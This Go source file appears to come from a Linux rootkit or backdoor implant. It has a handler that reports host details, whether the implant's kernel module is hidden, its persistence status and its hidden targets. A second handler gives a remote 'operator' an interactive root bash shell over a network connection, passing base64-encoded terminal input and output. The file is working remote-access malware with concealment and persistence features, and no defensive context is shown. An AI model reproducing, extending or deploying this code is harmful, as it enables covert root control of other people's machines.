package main

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/creack/pty"
)

func handleInfo(_ *bufio.Reader, conn net.Conn, _ string) error {
	hostname, _ := os.Hostname()
	kernel, _ := os.ReadFile("/proc/sys/kernel/osrelease")
	state, err := readKernelState()
	if err != nil {
		return err
	}
	info := struct {
		Hostname     string              `json:"hostname"`
		Kernel       string              `json:"kernel"`
		Arch         string              `json:"arch"`
		PID          int                 `json:"pid"`
		UID          int                 `json:"uid"`
		ModuleHidden bool                `json:"module_hidden"`
		Persisted    bool                `json:"persisted"`
		Hidden       map[string][]string `json:"hidden"`
	}{
		Hostname: hostname, Kernel: strings.TrimSpace(string(kernel)), Arch: runtime.GOARCH,
		PID: os.Getpid(), UID: os.Getuid(), ModuleHidden: state.moduleHidden,
		Persisted: persistenceInstalled(),
		Hidden:    state.targets,
	}
	data, err := json.Marshal(info)
	if err != nil {
		return err
	}
	_, err = fmt.Fprintf(conn, "INFO %s\n", data)
	return err
}

var operatorPTY struct {
	sync.Mutex
	file   *os.File
	output []byte
}

func handlePTY(_ *bufio.Reader, conn net.Conn, arg string) error {
	parts := strings.SplitN(arg, " ", 2)
	switch parts[0] {
	case "START":
		operatorPTY.Lock()
		if operatorPTY.file != nil {
			_ = operatorPTY.file.Close()
		}
		cmd := exec.Command("/bin/bash", "-i")
		cmd.Dir = "/root"
		cmd.Env = []string{
			"COLORTERM=truecolor",
			"HOME=/root",
			"LANG=C.UTF-8",
			"LOGNAME=root",
			"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
			"SHELL=/bin/bash",
			"TERM=xterm-256color",
			"USER=root",
		}
		file, err := pty.StartWithSize(cmd, &pty.Winsize{Rows: 24, Cols: 80})
		if err != nil {
			operatorPTY.Unlock()
			_, _ = fmt.Fprintf(conn, "ERR %v\n", err)
			return nil
		}
		operatorPTY.file = file
		operatorPTY.output = nil
		operatorPTY.Unlock()
		go readOperatorPTY(file)
	case "INPUT":
		if len(parts) != 2 {
			_, _ = fmt.Fprintln(conn, "ERR no PTY input")
			return nil
		}
		data, err := base64.StdEncoding.DecodeString(parts[1])
		if err != nil {
			_, _ = fmt.Fprintln(conn, "ERR invalid PTY input")
			return nil
		}
		operatorPTY.Lock()
		if operatorPTY.file == nil {
			operatorPTY.Unlock()
			_, _ = fmt.Fprintln(conn, "ERR no PTY")
			return nil
		}
		_, _ = operatorPTY.file.Write(data)
		operatorPTY.Unlock()
	case "RESIZE":
		var cols, rows uint16
		if len(parts) != 2 {
			_, _ = fmt.Fprintln(conn, "ERR invalid PTY size")
			return nil
		}
		if _, err := fmt.Sscanf(parts[1], "%d %d", &cols, &rows); err != nil || cols == 0 || rows == 0 {
			_, _ = fmt.Fprintln(conn, "ERR invalid PTY size")
			return nil
		}
		operatorPTY.Lock()
		if operatorPTY.file == nil {
			operatorPTY.Unlock()
			_, _ = fmt.Fprintln(conn, "ERR no PTY")
			return nil
		}
		_ = pty.Setsize(operatorPTY.file, &pty.Winsize{Rows: rows, Cols: cols})
		operatorPTY.Unlock()
	case "POLL":
		// Output is collected below without writing to the PTY.
	case "CLOSE":
		operatorPTY.Lock()
		if operatorPTY.file != nil {
			_ = operatorPTY.file.Close()
			operatorPTY.file = nil
		}
		operatorPTY.output = nil
		operatorPTY.Unlock()
		_, err := fmt.Fprintln(conn, "DATA")
		return err
	default:
		_, err := fmt.Fprintln(conn, "ERR invalid PTY operation")
		return err
	}

	time.Sleep(30 * time.Millisecond)
	operatorPTY.Lock()
	output := append([]byte(nil), operatorPTY.output...)
	operatorPTY.output = nil
	operatorPTY.Unlock()
	_, err := fmt.Fprintf(conn, "DATA %s\n", base64.StdEncoding.EncodeToString(output))
	return err
}

func readOperatorPTY(file *os.File) {
	buf := make([]byte, 4096)
	for {
		n, err := file.Read(buf)
		if n > 0 {
			operatorPTY.Lock()
			if operatorPTY.file == file {
				operatorPTY.output = append(operatorPTY.output, buf[:n]...)
			}
			operatorPTY.Unlock()
		}
		if err != nil {
			return
		}
	}
}
